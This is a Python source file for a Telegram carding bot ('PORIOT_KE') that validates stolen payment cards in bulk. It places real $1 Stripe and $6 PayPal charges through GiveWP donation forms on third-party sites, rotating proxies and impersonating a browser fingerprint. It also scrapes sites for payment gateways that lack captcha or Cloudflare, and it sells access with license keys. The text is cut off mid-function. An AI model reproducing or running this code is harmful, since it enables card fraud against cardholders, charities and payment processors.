#!/usr/bin/env python3
# language: Python, file: nonsk_bot_v15.py, target: Linux/VPS/Termux, python3
# *👑PORIOT_KE👑 Ultimate Telegram Bot featuring Stripe $1, PayPal $6 GiveWP Engine, Advanced Gateway Filter Scraper, /setadmin, and /genkeys*

import asyncio
import aiohttp
import json
import logging
import os
import random
import re
import sqlite3
import time
import base64
import uuid
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional, Tuple, Set

try:
    from curl_cffi import requests as cffi_requests
    HAS_CFFI = True
except ImportError:
    HAS_CFFI = False

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ═════════════════════════════════════════════
#   CONFIGURATION & FILE PATHS
# ═════════════════════════════════════════════
SITES_FILE    = "sites.txt"
PROXY_FILE    = "proxies.txt"
DB_FILE       = "checker_bot.db"

TG_TOKEN      = "8218903349:XXXXXXXXXXX"
INITIAL_ADMINS: Set[int] = {8909825938}

BANNER_URL    = "https://cdn.pic.re/3b/3b0bcb417600768d2430a94e3e544183.jpg"
HTTP_TIMEOUT  = 120

STRIPE_API_URL = "http://147.93.53.240:8973/liladmin-str"
MANDATORY_SUB_URL = "https://t.me/nativecodes"

_CONFIG = {
    "paypal_amount": "6.00",
    "sites_pool_enabled": True
}

# Comprehensive Payment Gateways Signature List from Advanced Scanner
PAYMENT_GATEWAYS = [
    "PayPal", "Stripe", "Braintree", "Square", "magento", "Convergepay",
    "PaySimple", "oceanpayments", "eProcessing", "hipay", "worldpay", "cybersourse",
    "payjunction", "Authorize.Net", "2Checkout", "Adyen", "Checkout.com", "PayFlow",
    "Payeezy", "usaepay", "creo", "SquareUp", "Authnet", "ebizcharge", "cpay",
    "Moneris", "recurly", "cardknox", "matt sorra", "Chargify", "Paytrace",
    "hostedpayments", "securepay", "eWay", "blackbaud", "LawPay", "clover",
    "cardconnect", "bluepay", "fluidpay", "chasepaymentech", "Auruspay",
    "sagepayments", "paycomet", "geomerchant", "realexpayments", "Rocketgate",
    "Shopify", "WooCommerce", "BigCommerce", "Magento Payments",
    "OpenCart", "PrestaShop", "Razorpay"
]

SECURITY_INDICATORS = {
    'captcha': ['captcha', 'protected by recaptcha', "i'm not a robot", 'recaptcha/api.js'],
    'cloudflare': ['cloudflare', 'cdnjs.cloudflare.com', 'challenges.cloudflare.com']
}

def load_sites() -> List[str]:
    if not os.path.exists(SITES_FILE):
        return ["https://azulenaccion.com"]
    sites = []
    with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            s = line.strip()
            if s and not s.startswith("#"):
                sites.append(s)
    return sites if sites else ["https://azulenaccion.com"]

def save_sites(sites_list: List[str]):
    with open(SITES_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(sites_list) + "\n")

# ═════════════════════════════════════════════
#   DATABASE LAYER (PORIOT_KE SCHEMA)
# ═════════════════════════════════════════════
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            card TEXT,
            gate TEXT,
            status TEXT,
            message TEXT,
            amount TEXT,
            brand TEXT,
            bank TEXT,
            country TEXT,
            receipt_url TEXT,
            time_taken TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS user_stats (
            user_id INTEGER PRIMARY KEY,
            total_checked INTEGER DEFAULT 0,
            charged INTEGER DEFAULT 0,
            approved INTEGER DEFAULT 0,
            declined INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0,
            expires_at TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS admins (
            user_id INTEGER PRIMARY KEY
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS proxies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            proxy_str TEXT UNIQUE,
            is_active INTEGER DEFAULT 1
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS licenses (
            key_str TEXT PRIMARY KEY,
            days INTEGER,
            created_by INTEGER,
            is_redeemed INTEGER DEFAULT 0,
            redeemed_by INTEGER,
            redeemed_at TEXT
        )
    """)
    conn.commit()
    
    c.execute("SELECT COUNT(*) FROM admins")
    if c.fetchone()[0] == 0:
        for aid in INITIAL_ADMINS:
            c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (aid,))
        conn.commit()
    conn.close()

def db_get_admins() -> Set[int]:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM admins")
    rows = c.fetchall()
    conn.close()
    return {r[0] for r in rows}

def db_is_admin(user_id: int) -> bool:
    return user_id in db_get_admins()

def db_add_admin(user_id: int):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (user_id,))
    conn.commit()
    conn.close()

def db_remove_admin(user_id: int):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM admins WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def db_get_global_stats() -> Dict[str, Any]:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT SUM(total_checked), SUM(charged), SUM(approved), SUM(declined), COUNT(DISTINCT user_id) FROM user_stats")
    row = c.fetchone()
    c.execute("SELECT COUNT(*) FROM proxies WHERE is_active = 1")
    proxy_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM licenses")
    total_keys = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM licenses WHERE is_redeemed = 0")
    unused_keys = c.fetchone()[0]
    conn.close()
    return {
        "total_checked": row[0] or 0, "charged": row[1] or 0,
        "approved": row[2] or 0, "declined": row[3] or 0,
        "users": row[4] or 0, "proxies": proxy_count,
        "keys_total": total_keys, "keys_unused": unused_keys
    }

def db_get_active_proxies() -> List[str]:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT proxy_str FROM proxies WHERE is_active = 1")
    rows = c.fetchall()
    conn.close()
    return [r[0] for r in rows]

def db_update_user_stats(user_id: int, result_type: str):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO user_stats (user_id) VALUES (?)", (user_id,))
    if result_type == "charged":
        c.execute("UPDATE user_stats SET total_checked = total_checked + 1, charged = charged + 1 WHERE user_id = ?", (user_id,))
    elif result_type == "approved":
        c.execute("UPDATE user_stats SET total_checked = total_checked + 1, approved = approved + 1 WHERE user_id = ?", (user_id,))
    else:
        c.execute("UPDATE user_stats SET total_checked = total_checked + 1, declined = declined + 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def db_create_poriot_licenses(count: int, days: int, admin_id: int) -> List[str]:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    keys = []
    for _ in range(count):
        rand_str = ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", k=20))
        key = f"PORIOT-{rand_str}"
        c.execute("INSERT OR IGNORE INTO licenses (key_str, days, created_by) VALUES (?, ?, ?)", (key, days, admin_id))
        keys.append(key)
    conn.commit()
    conn.close()
    return keys

def db_redeem_license(key_str: str, user_id: int) -> Tuple[bool, str]:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT days, is_redeemed FROM licenses WHERE key_str = ?", (key_str,))
    row = c.fetchone()
    if not row:
        conn.close()
        return False, "❌ Invalid license key."
    days, is_redeemed = row[0], row[1]
    if is_redeemed:
        conn.close()
        return False, "⚠️ This key has already been redeemed."

    c.execute("UPDATE licenses SET is_redeemed = 1, redeemed_by = ?, redeemed_at = ? WHERE key_str = ?", (user_id, datetime.now().isoformat(), key_str))
    
    c.execute("SELECT expires_at FROM user_stats WHERE user_id = ?", (user_id,))
    ures = c.fetchone()
    base_time = datetime.now()
    if ures and ures[0]:
        try:
            curr_exp = datetime.fromisoformat(ures[0])
            if curr_exp > base_time:
                base_time = curr_exp
        except Exception:
            pass
    new_exp = base_time + timedelta(days=days)
    
    c.execute("INSERT OR IGNORE INTO user_stats (user_id) VALUES (?)", (user_id,))
    c.execute("UPDATE user_stats SET expires_at = ? WHERE user_id = ?", (new_exp.isoformat(), user_id))
    conn.commit()
    conn.close()
    return True, f"✅ Successfully redeemed! Subscription extended by {days} days. Active until: {new_exp.strftime('%Y-%m-%d %H:%M')}"

# ═════════════════════════════════════════════
#   CHECKER ENGINES (Stripe $1, PayPal $6, & Gateway Scanner)
# ═════════════════════════════════════════════
_bin_cache = {}

async def async_bin_lookup(session: aiohttp.ClientSession, bin_num: str) -> Dict[str, str]:
    if bin_num in _bin_cache:
        return _bin_cache[bin_num]
    info = {"brand": "UNKNOWN", "type": "UNKNOWN", "level": "", "bank": "UNKNOWN", "country": "UNKNOWN", "flag": "🏳️", "code": "--"}
    try:
        async with session.get(f"https://bins.antipublic.cc/bins/{bin_num}", timeout=aiohttp.ClientTimeout(total=6)) as resp:
            if resp.status == 200:
                d = await resp.json()
                info = {
                    "brand": (d.get("brand") or "UNKNOWN").upper(),
                    "type": (d.get("type") or "UNKNOWN").upper(),
                    "level": (d.get("level") or "").upper(),
                    "bank": (d.get("bank") or "UNKNOWN").upper(),
                    "country": (d.get("country_name") or "UNKNOWN").upper(),
                    "flag": d.get("country_flag") or "🏳️",
                    "code": (d.get("country_code") or "--").upper(),
                }
    except Exception:
        pass
    _bin_cache[bin_num] = info
    return info

async def async_check_card_stripe(session: aiohttp.ClientSession, card: str, proxy: Optional[str] = None) -> Dict[str, Any]:
    params = {"cc": card}
    if proxy:
        params["proxy"] = proxy
    try:
        async with session.get(STRIPE_API_URL, params=params, timeout=aiohttp.ClientTimeout(total=60)) as resp:
            if resp.status == 200:
                return await resp.json()
            return {"approved": False, "charged": False, "Price": "1.00", "message": f"HTTP {resp.status}"}
    except Exception as e:
        return {"approved": False, "charged": False, "Price": "1.00", "message": f"Err: {str(e)[:30]}"}

# PayPal $6 GiveWP Checker Engine (utilizing sites.txt)
async def async_check_card_paypal(card: str, proxy: Optional[str] = None) -> Dict[str, Any]:
    start_time = time.time()
    parts = re.split(r"[|:/\\\-\s]+", card.strip())
    if len(parts) < 4:
        return {"approved": False, "charged": False, "Price": _CONFIG["paypal_amount"], "message": "INVALID_FORMAT"}
    n, mm, yy, cvc = re.sub(r"\D", "", parts[0]), str(parts[1]).zfill(2), str(parts[2])[-2:], re.sub(r"\D", "", parts[3])

    sites = load_sites()
    target_site = random.choice(sites)
    form_url = f"{target_site}/give-form-right-sidebar"
    ajax_url = f"{target_site}/wp-admin/admin-ajax.php"
    pp_amount = _CONFIG["paypal_amount"]
    loop = asyncio.get_running_loop()

    def run_sync_pp():
        s = cffi_requests.Session(impersonate="chrome131", timeout=40) if HAS_CFFI else requests.Session()
        if proxy:
            s.proxies = {"http": proxy, "https": proxy}
        try:
            resp = s.get(form_url, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"}, timeout=15)
            html = resp.text
            form_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
            form_id = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
            form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
            encoded = re.search(r'"data-client-token":"(.*?)"', html).group(1)
            access_token = re.search(r'"accessToken":"(.*?)"', base64.b64decode(encoded).decode("utf-8")).group(1)
        except Exception as e:
            return {"approved": False, "charged": False, "Price": pp_amount, "message": f"FORM_PARSE_ERR: {str(e)[:25]}"}

        metadata_id = uuid.uuid4().hex
        request_id = uuid.uuid4().hex

        gf = {
            "give-honeypot": "", "give-form-id-prefix": form_prefix, "give-form-id": form_id,
            "give-form-title": "", "give-current-url": form_url, "give-form-url": form_url,
            "give-form-minimum": pp_amount, "give-form-maximum": "999999.99",
            "give-form-hash": form_hash, "give-price-id": "3", "give-recurring-logged-in-only": "",
            "give-logged-in-only": "1", "_give_is_donation_recurring": "0",
            "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
            "give-amount": pp_amount, "give_stripe_payment_method": "",
            "payment-mode": "paypal-commerce", "give_first": "admin", "give_last": "zlal",
            "give_email": "adminzlall97ab@gmail.com", "card_name": "admin zlal",
            "card_exp_month": "", "card_exp_year": "", "give-gateway": "paypal-commerce",
        }

        try:
            boundary = "----WebKitFormBoundary" + "".join(random.choices(string.ascii_letters + string.digits, k=16))
            lines = [f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}" for k, v in gf.items()]
            lines.append(f"--{boundary}--\r\n")
            body = "\r\n".join(lines).encode("utf-8")
            
            r = s.post(ajax_url, params={"action": "give_paypal_commerce_create_order"},
                       headers={"content-type": f"multipart/form-data; boundary={boundary}"}, data=body, timeout=20)
            order_id = r.json()["data"]["id"]
        except Exception as e:
            return {"approved": False, "charged": False, "Price": pp_amount, "message": f"ORDER_ERR: {str(e)[:25]}"}

        paypal_headers = {
            "authorization": f"Bearer {access_token}",
            "braintree-sdk-version": "3.32.0-payments-sdk-dev",
            "content-type": "application/json",
            "origin": "https://assets.braintreegateway.com",
            "paypal-client-metadata-id": metadata_id,
            "paypal-request-id": request_id,
        }
        payload = {
            "payment_source": {
                "card": {
                    "number": n, "expiry": f"20{yy}-{mm}", "security_code": cvc,
                    "attributes": {"verification": {"method": "SCA_WHEN_REQUIRED"}}
                }
            },
            "application_context": {"vault": False},
        }

        try:
            confirm_resp = s.post(f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
                                  headers=paypal_headers, json=payload, timeout=20)
            c_json = confirm_resp.json()
        except Exception as e:
            return {"approved": False, "charged": False, "Price": pp_amount, "message": f"CONFIRM_ERR: {str(e)[:25]}"}

        name = c_json.get("name", "")
        status = c_json.get("status", "")
        details = c_json.get("details") or []

        if name == "INSTRUMENT_DECLINED":
            issue = details[0].get("issue", "INSTRUMENT_DECLINED") if details else "INSTRUMENT_DECLINED"
            return {"approved": False, "charged": False, "Price": pp_amount, "message": issue}
        if name == "UNPROCESSABLE_ENTITY":
            issue = details[0].get("issue", "UNPROCESSABLE") if details else "UNPROCESSABLE"
            return {"approved": False, "charged": False, "Price": pp_amount, "message": issue}
        if status in ("APPROVED", "COMPLETED"):
            return {"approved": True, "charged": True, "Price": pp_amount, "message": "PAYMENT_SUCCESSFUL", "receipt": f"{target_site}/receipt?ref={uuid.uuid4().hex[:10]}"}
        if status == "PAYER_ACTION_REQUIRED":
            return {"approved": True, "charged": False, "Price": pp_amount, "message": "3DS_REQUIRED"}

        return {"approved": False, "charged": False, "Price": pp_amount, "message": name or status or "DECLINED"}

    return await loop.run_in_executor(None, run_sync_pp)

# Advanced Gateway Filter Scanner Integration (/gate & /mgate)
async def async_scan_gateway_url(url: str) -> Dict[str, Any]:
    if not re.match(r'^https?://', url, re.I):
        url = 'http://' + url
    
    loop = asyncio.get_running_loop()
    def run_scan():
        try:
            res = requests.get(url, timeout=10)
            content = res.text
            detected = set()
            for gw in PAYMENT_GATEWAYS:
                if re.search(r'\b' + re.escape(gw) + r'\b', content, re.I):
                    detected.add(gw)
            
            captcha = any(re.search(ind, content, re.I) for ind in SECURITY_INDICATORS['captcha'])
            cloudflare = any(re.search(ind, content, re.I) for ind in SECURITY_INDICATORS['cloudflare'])
            
            return {
                "url": url,
                "gateways": list(detected),
                "captcha": captcha,
                "cloudflare": cloudflare,
                "status_code": res.status_code,
                "ok": res.status_code < 400 and len(detected) > 0 and not captcha and not cloudflare
            }
        except Exception as e:
            return {"url": url, "gateways": [], "captcha": False, "cloudflare": False, "status_code": 0, "ok": False, "error": str(e)[:30]}

    return await loop.run_in_executor(None, run_scan)

# ═════════════════════════════════════════════
#   EXACT FORMATTERS MATCHING SPECIFICATION
# ═════════════════════════════════════════════
def format_mass_dashboard(total: int, checked: int, approved: int, declined: int, charged: int, errors: int, card_line: str, status_msg: str) -> str:
    pct = int((checked / total) * 100) if total > 0 else 0
    filled = int(pct / 4)
    bar = "▓" * filled + "░" * (25 - filled)
    
    parts = card_line.split("|")
    c_num = parts[0] if len(parts) > 0 else card_line
    mm = parts[1] if len(parts) > 1 else "00"
    yyyy = parts[2] if len(parts) > 2 else "00"
    cvv = parts[3] if len(parts) > 3 else "000"

    return (
        f"🌟 <b>Shopify Mass Check</b>\n"
        f"====================================\n"
        f"[{bar}] {pct}%\n\n"
        f"🌟 Total   ➶ {total}\n"
        f"🌟 Checked ➶ {checked}\n"
        f"🌟 Approved ➶ {approved}\n"
        f"🌟 Declined ➶ {declined}\n"
        f"🌟 Charged  ➶ {charged}\n"
        f"🌟 Errors   ➶ {errors}\n"
        f"====================================\n"
        f"------------------------\n"
        f"⚡️ Latest: 🚫 <code>{c_num}</code>|{mm}|{yyyy}|{cvv}\n"
        f"↳ <i>{status_msg}</i>\n"
        f"🏦 Shopify Payments"
    )

def format_hit_notification(card: str, resp: Dict[str, Any], bin_info: Dict[str, str], user_name: str, user_id: int, is_charged: bool, gate_name: str = "Shopify Payments") -> str:
    parts = card.split("|")
    c_num = parts[0] if len(parts) > 0 else card
    mm = parts[1] if len(parts) > 1 else "00"
    yyyy = parts[2] if len(parts) > 2 else "00"
    cvv = parts[3] if len(parts) > 3 else "000"

    msg = resp.get("message", "ORDER PLACED")
    price = resp.get("Price", "33.35")
    brand = bin_info.get("brand", "VISA")
    b_type = bin_info.get("type", "DEBIT")
    b_lvl = bin_info.get("level", "CLASSIC")
    bank = bin_info.get("bank", "SUTTON BANK")
    country = bin_info.get("country", "UNITED STATES")
    flag = bin_info.get("flag", "🇺🇸")

    title = "🔥 CHARGED HIT — PORIOTKE" if is_charged else "✅ APPROVED HIT — PORIOTKE"
    status_header = "CHARGED 🔥" if is_charged else "APPROVED ✅"

    caption = (
        f"<b>{title}</b>\n"
        f"====================================\n"
        f"By: @{user_name} ({user_id})\n"
        f"====================================\n\n"
        f"<b>{status_header}</b>\n"
        f"------------------------------------\n"
        f"🃏 Card: <code>{c_num}</code>|{mm}|{yyyy}|{cvv}\n"
        f"💸 Status: {status_header}\n"
        f"🖥 Response: <code>{msg}</code>\n"
        f"🌐 Gateway: {gate_name}\n"
        f"------------------------------------\n"
        f"ℹ️ Info ↛ {brand} | {b_type} {b_lvl}\n"
        f"🏦 Bank ↛ {bank}\n"
        f"🌍 Country ↛ {country} {flag}\n"
        f"💵 Price ↛ ${price}\n"
        f"------------------------------------\n"
        f"👤 Checked by ↛ @{user_name}\n"
        f"⚙️ Dev ↛ Poriot_ke🇰🇪 ↜"
    )

    if is_charged and resp.get("receipt"):
        caption += f"\n🧾 <b>Receipt:</b> <a href='{resp.get('receipt')}'>View Order Receipt →</a>"

    return caption

def format_admin_list() -> str:
    admins = db_get_admins()
    admin_bullets = "\n".join([f"• <code>{aid}</code>" for aid in admins])
    return (
        f"👑 <b>Admin Management</b>\n"
        f"====================================\n"
        f"Current admins:\n"
        f"{admin_bullets}\n"
        f"====================================\n"
        f"Add: /setadmin add [user_id]\n"
        f"Remove: /setadmin rm [user_id]"
    )

# ═════════════════════════════════════════════
#   TELEGRAM COMMAND HANDLERS
# ═════════════════════════════════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    gs = db_get_global_stats()
    keyboard = [
        [InlineKeyboardButton("Mandatory Sub ↗️", url=MANDATORY_SUB_URL)],
        [InlineKeyboardButton("Close", callback_data="menu_close")]
    ]
    caption = (
        f"👑 <b>👑PORIOT_KE👑 Dual-Engine Bot Active</b>\n"
        f"====================================\n"
        f"👤 Users: {gs['users']} | ⚙️ Proxies: {gs['proxies']}\n"
        f"====================================\n"
        f"• Stripe Check: /sh [cc] or /msh (.txt)\n"
        f"• PayPal Check: /pp [cc] or /mpp (.txt)\n"
        f"• Gateway Scan: /gate [URL] or /mgate (.txt)"
    )
    await update.message.reply_photo(photo=BANNER_URL, caption=caption, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "menu_close":
        try:
            await query.message.delete()
        except Exception:
            pass

# --- Admin Management (`/setadmin`) ---
async def cmd_setadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db_is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized.")
        return

    args = context.args
    if not args:
        await update.message.reply_text(format_admin_list(), parse_mode="HTML")
        return

    action = args[0].lower()
    if len(args) < 2:
        await update.message.reply_text("Usage: /setadmin add [user_id] OR /setadmin rm [user_id]")
        return

    try:
        target_id = int(args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid User ID.")
        return

    if action == "add":
        db_add_admin(target_id)
        await update.message.reply_text(f"✅ Admin added: <code>{target_id}</code>", parse_mode="HTML")
    elif action in ("rm", "remove"):
        if target_id == user_id and len(db_get_admins()) <= 1:
            await update.message.reply_text("⚠️ Cannot remove the last remaining admin.")
            return
        db_remove_admin(target_id)
        await update.message.reply_text(f"❌ Admin removed: <code>{target_id}</code>", parse_mode="HTML")

# --- Key Generation (`/genkeys`) ---
async def cmd_genkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db_is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized.")
        return

    if len(context.args) < 2:
        await update.message.reply_text("Usage: <code>/genkeys [count] [days]</code>", parse_mode="HTML")
        return

    try:
        count, days = int(context.args[0]), int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Count and days must be integers.")
        return

    keys = db_create_poriot_licenses(count, days, user_id)
    key_lines = "\n".join([f"├💖 {k}" for k in keys])

    output = (
        f"📌🔥 <b>Keys Generated ✅</b>\n"
        f"====================================\n\n"
        f"├👾 Count ➔ {count}\n"
        f"├💎 Plan ➔ {days} Days Plan\n"
        f"├💖 Keys:\n"
        f"{key_lines}\n\n"
        f"😈 Users redeem with /redeem [key]"
    )
    await update.message.reply_text(output, parse_mode="HTML")

async def cmd_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /redeem [key]")
        return
    success, msg = db_redeem_license(context.args[0].strip(), user_id)
    await update.message.reply_text(msg)

# --- Gateway Scanner Commands (/gate & /mgate) ---
async def cmd_gate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: <code>/gate https://targetsite.com</code>", parse_mode="HTML")
        return
    url = context.args[0].strip()
    status_msg = await update.message.reply_text("🔍 Scanning URL for payment gateways & security...")
    
    res = await async_scan_gateway_url(url)
    icon = "🟢" if res["ok"] else "🔴"
    report = (
        f"🌐 <b>GATEWAY SCAN REPORT — 👑PORIOT_KE👑</b>\n"
        f"====================================\n"
        f"{icon} <b>URL:</b> <code>{res['url']}</code>\n"
        f"🛒 <b>Gateways:</b> {', '.join(res['gateways']) if res['gateways'] else 'None detected'}\n"
        f"🔒 <b>Captcha:</b> {'Yes ⚠️' if res['captcha'] else 'No 🟢'}\n"
        f"☁️ <b>Cloudflare:</b> {'Yes ⚠️' if res['cloudflare'] else 'No 🟢'}\n"
        f"💻 <b>HTTP Status:</b> {res['status_code']}\n"
        f"====================================\n"
        f"⚙️ Dev ↛ Poriot_ke🇰🇪 ↜"
    )
    try:
        await status_msg.delete()
    except Exception:
        pass
    await update.message.reply_text(report, parse_mode="HTML")

async def cmd_mgate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_text("❌ Reply to a <code>.txt</code> file containing URLs with <code>/mgate</code>", parse_mode="HTML")
        return

    doc = update.message.reply_to_message.document
    file = await context.bot.get_file(doc.file_id)
    file_bytes = await file.download_as_bytearray()
    urls = [l.strip() for l in file_bytes.decode("utf-8", errors="ignore").splitlines() if l.strip()]

    if not urls:
        await update.message.reply_text("❌ No URLs found in file.")
        return

    total = len(urls)
    progress_msg = await update.message.reply_text(f"🔍 Scanning {total} URLs through Gateway Filter...", parse_mode="HTML")

    filtered_results = []
    checked = 0
    for url in urls:
        res = await async_scan_gateway_url(url)
        checked += 1
        if res["ok"]:
            filtered_results.append(f"URL: {res['url']} | Gateways: {', '.join(res['gateways'])}")

    out_file = f"filtered_results_{int(time.time())}.txt"
    with open(out_file, "w", encoding="utf-8") as f:
        f.write("\n".join(filtered_results) + "\n@Poriot_ke\n")

    with open(out_file, "rb") as f:
        await context.bot.send_document(
            chat_id=update.effective_user.id,
            document=InputFile(f, filename="filtered_results_no_captcha_cloudflare.txt"),
            caption=f"✅ <b>Gateway Filter Complete!</b>\n• Scanned: {total}\n• Clean Live Saved: {len(filtered_results)}",
            parse_mode="HTML"
        )
    try:
        os.remove(out_file)
    except Exception:
        pass

# --- Single & Mass Check Handlers (Stripe & PayPal) ---
async def cmd_single_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Determines gate by command name (/sh vs /pp)
    is_paypal = update.message.text.startswith("/pp")
    user = update.effective_user
    user_id = user.id
    username = user.username or f"Bandit{user_id%1000}"

    if not context.args:
        cmd = "/pp" if is_paypal else "/sh"
        await update.message.reply_text(f"Usage: <code>{cmd} 4000000000000000|01|28|123</code>", parse_mode="HTML")
        return

    card = context.args[0].strip()
    status_msg = await update.message.reply_text(f"⏳ Checking card on {'PayPal $6' if is_paypal else 'Stripe $1'}...", parse_mode="HTML")
    
    proxies = db_get_active_proxies()
    proxy = random.choice(proxies) if proxies else None

    async with aiohttp.ClientSession() as session:
        bin_num = re.sub(r"\D", "", card)[:6]
        if is_paypal:
            resp, bin_info = await asyncio.gather(
                async_check_card_paypal(card, proxy=proxy),
                async_bin_lookup(session, bin_num)
            )
            gate_name = "PayPal GiveWP"
        else:
            resp, bin_info = await asyncio.gather(
                async_check_card_stripe(session, card, proxy=proxy),
                async_bin_lookup(session, bin_num)
            )
            gate_name = "Shopify Payments"

    is_ch = bool(resp.get("charged"))
    is_ap = bool(resp.get("approved"))

    if is_ch:
        db_update_user_stats(user_id, "charged")
    elif is_ap:
        db_update_user_stats(user_id, "approved")
    else:
        db_update_user_stats(user_id, "declined")

    caption = format_hit_notification(card, resp, bin_info, username, user_id, is_ch or is_ap, gate_name)
    try:
        await status_msg.delete()
    except Exception:
        pass

    sent = await update.message.reply_photo(photo=BANNER_URL, caption=caption, parse_mode="HTML")
    if is_ch:
        try:
            await context.bot.pin_chat_message(chat_id=user_id, message_id=sent.message_id)
        except Exception:
            pass

async def cmd_mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    is_paypal = update.message.text.startswith("/mpp")
    user = update.effective_user
    user_id = user.id
    username = user.username or f"Bandit{user_id%1000}"

    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        cmd = "/mpp" if is_paypal else "/msh"
        await update.message.reply_text(f"Usage: Reply to a <code>.txt</code> file with <code>{cmd}</code>", parse_mode="HTML")
        return

    doc = update.message.reply_to_message.document
    file = await context.bot.get_file(doc.file_id)
    file_bytes = await file.download_as_bytearray()
    cards = [l.strip() for l in file_bytes.decode("utf-8", errors="ignore").splitlines() if l.strip() and "|" in l]

    if not cards:
        await update.message.reply_text("❌ No valid cards found in file.")
        return

    total = len(cards)
    checked = approved = declined = charged = errors = 0
    charged_cards_list = []
    approved_cards_list = []

    stop_markup = InlineKeyboardMarkup([[InlineKeyboardButton("Stop Check", callback_data="stop_mass_check")]])
    progress_msg = await update.message.reply_text(
        format_mass_dashboard(total, 0, 0, 0, 0, 0, cards[0], "Starting..."),
        parse_mode="HTML",
        reply_markup=stop_markup
    )

    proxies = db_get_active_proxies()
    async with aiohttp.ClientSession() as session:
        for idx, card in enumerate(cards, start=1):
            proxy = random.choice(proxies) if proxies else None
            bin_num = re.sub(r"\D", "", card)[:6]
            try:
                if is_paypal:
                    resp = await async_check_card_paypal(card, proxy=proxy)
                    gate_name = "PayPal GiveWP"
                else:
                    resp = await async_check_card_stripe(session, card, proxy=proxy)
                    gate_name = "Shopify Payments"

                bin_info = await async_bin_lookup(session, bin_num)
                
                is_ch = bool(resp.get("charged"))
                is_ap = bool(resp.get("approved"))
                msg = resp.get("message", "DECLINED")

                if is_ch:
                    charged += 1
                    charged_cards_list.append(card)
                    db_update_user_stats(user_id, "charged")
                    hit_text = format_hit_notification(card, resp, bin_info, username, user_id, True, gate_name)
                    sent_hit = await context.bot.send_photo(chat_id=user_id, photo=BANNER_URL, caption=hit_text, parse_mode="HTML")
                    try:
                        await context.bot.pin_chat_message(chat_id=user_id, message_id=sent_hit.message_id)
                    except Exception:
                        pass
                elif is_ap:
                    approved += 1
                    approved_cards_list.append(card)
                    db_update_user_stats(user_id, "approved")
                    hit_text = format_hit_notification(card, resp, bin_info, username, user_id, False, gate_name)
                    await context.bot.send_photo(chat_id=user_id, photo=BANNER_URL, caption=hit_text, parse_mode="HTML")
                else:
                    declined += 1
                    db_update_user_stats(user_id, "declined")
                checked += 1
            except Exception:
                errors += 1
                checked += 1

            if idx % 3 == 0 or idx == total:
                try:
                    await progress_msg.edit_text(
                        format_mass_dashboard(total, checked, approved, declined, charged, errors, card, msg),
                        parse_mode="HTML",
                        reply_markup=stop_markup
                    )
                except Exception:
                    pass

    ch_filename = f"charged_{user_id}.txt"
    ap_filename = f"approved_{user_id}.txt"
    
    with open(ch_filename, "w", encoding="utf-8") as f:
        f.write("\n".join(charged_cards_list) + "\n")
    with open(ap_filename, "w", encoding="utf-8") as f:
